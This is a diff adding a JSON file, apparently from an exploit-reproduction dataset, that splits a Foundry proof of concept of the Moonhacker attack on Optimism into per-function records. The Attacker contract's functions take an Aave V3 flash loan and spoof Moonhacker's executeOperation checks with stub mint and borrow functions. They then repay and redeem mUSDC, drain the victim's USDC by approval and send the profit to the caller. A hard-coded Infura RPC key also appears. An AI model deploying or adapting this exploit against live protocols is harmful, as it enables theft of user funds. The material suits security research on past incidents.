@@ -1,0 +1,156 @@
+[
+  {
+    "contract/interface": "Attacker",
+    "source_type": "attacker_contract",
+    "function_name": "attack",
+    "original_code": "    function attack() public {\n        // Start the flashloan\n        aaveV3.flashLoanSimple(address(this), address(USDC), 883_917_967_954, new bytes(0), 0);\n    }\n\n    // Called back by AAVE V3\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attacker",
+    "source_type": "attacker_contract",
+    "function_name": "borrow",
+    "original_code": "    function borrow(uint256 amount) public pure returns (uint8) {\n        return 0;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attacker",
+    "source_type": "attacker_contract",
+    "function_name": "executeOperation",
+    "original_code": "    function executeOperation(\n        address token,\n        uint256 amountBorrowed,\n        uint256 premium,\n        address initiator,\n        bytes calldata params\n    ) external;\n}\n\ncontract Moonhacker is BaseTestWithBalanceLog {\n    uint256 blocknumToForkFrom = 129_697_251 - 1;\n    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);\n    IMusdc mUSDC = IMusdc(0x8E08617b0d66359D73Aa11E11017834C29155525);\n    IMoonhacker moonhacker = IMoonhacker(0xD9B45e2c389b6Ad55dD3631AbC1de6F2D2229847);\n    IERC20 USDC = IERC20(0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attacker",
+    "source_type": "attacker_contract",
+    "function_name": "getProfit",
+    "original_code": "    function getProfit() public{\n        uint256 profit = USDC.balanceOf(address(this));\n        USDC.transfer(msg.sender, profit);\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attacker",
+    "source_type": "attacker_contract",
+    "function_name": "mint",
+    "original_code": "    function mint(uint256 amount) public pure returns (uint8) {\n        return 0;\n    }\n\n    // Cheat moonhacker to pass the check (SUPPLY part)\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attacker",
+    "source_type": "attacker_contract",
+    "function_name": "redeem",
+    "original_code": "    function redeem() public {\n        // Accrue interest to updated borrowIndex and then calculate account's borrow balance using the updated borrowIndex\n        uint256 borrowBalance = mUSDC.borrowBalanceCurrent(address(moonhacker));\n        // Get moonhacker's mTokenBalance, borrowBalance, and exchangeRateMantissa\n        (, uint256 mTokenBalance,,) = mUSDC.getAccountSnapshot(address(moonhacker));\n        // Give moonhacker USDC to repay\n        USDC.transfer(address(moonhacker), borrowBalance);\n\n        uint8 operationType = 1; // REDEEM\n        bytes memory encodedRedeemParams = abi.encode(operationType, address(mUSDC), mTokenBalance);\n\n        // IERC20(token).approve(mToken, amountBorrowed) => IERC20(USDC).approve(mUSDC, borrowBalance);\n        // IMToken(mToken).repayBorrow(amountBorrowed) => IMToken(mUSDC).repayBorrow(borrowBalance)\n        // IMToken(mToken).redeem(amountToSupplyOrReedem) => IMToken(mUSDC).redeem(mTokenBalance)\n        // Get more USDC back by repaying and redeeming\n        moonhacker.executeOperation(address(USDC), borrowBalance, 0, address(this), encodedRedeemParams);\n    }\n\n    // Get back the USDC from moonhacker to attacker contract\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attacker",
+    "source_type": "attacker_contract",
+    "function_name": "returnFunds",
+    "original_code": "    function returnFunds() public {\n        uint256 moonhackerUSDCBalance = USDC.balanceOf(address(moonhacker));\n        uint8 operationType = 0; // SUPPLY\n        bytes memory encodedReturnParams = abi.encode(operationType, address(this), 0);\n\n        // IERC20(token).approve(mToken, totalSupplyAmount);\n        // IERC20(USDC).approve(address(this), moonhackerUSDCBalance);\n        // Approve USDC to attacker contract\n        moonhacker.executeOperation(address(USDC), moonhackerUSDCBalance, 0, address(this), encodedReturnParams);\n        \n        USDC.transferFrom(address(moonhacker), address(this), moonhackerUSDCBalance);\n    }\n\n    // Cheat moonhacker to pass the check (SUPPLY part)\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Moonhacker",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Moonhacker",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Moonhacker",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Moonhacker",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Moonhacker",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Moonhacker",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        // You may need to change \"optimism\" to your own rpc url\n        // vm.createSelectFork(\"optimism\", blocknumToForkFrom);\n        vm.createSelectFork(\"https://optimism-mainnet.infura.io/v3/3114f26b0b814b5881d86af336b2be9b\", blocknumToForkFrom);\n\n        fundingToken = address(USDC);\n\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(mUSDC), \"mUSDC\");\n        vm.label(address(moonhacker), \"moonhacker\");\n        vm.label(address(aaveV3), \"AAVE V3\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Moonhacker",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Moonhacker",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Moonhacker",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Moonhacker",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Moonhacker",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Moonhacker",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Moonhacker",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public balanceLog {\n        Attacker attacker = new Attacker();\n        attacker.attack();\n        attacker.getProfit();\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMusdc",
+    "source_type": "victim_contract",
+    "function_name": "borrowBalanceCurrent",
+    "original_code": "    function borrowBalanceCurrent(\n        address account\n    ) external override returns (uint) {\n        bytes memory data = delegateToImplementation(\n            abi.encodeWithSignature(\"borrowBalanceCurrent(address)\", account)\n        );\n        return abi.decode(data, (uint));\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMusdc",
+    "source_type": "victim_contract",
+    "function_name": "getAccountSnapshot",
+    "original_code": "    function getAccountSnapshot(\n        address account\n    ) external view override returns (uint, uint, uint, uint) {\n        bytes memory data = delegateToViewImplementation(\n            abi.encodeWithSignature(\"getAccountSnapshot(address)\", account)\n        );\n        return abi.decode(data, (uint, uint, uint, uint));\n    }\n\n",
+    "description": ""
+  }
+]
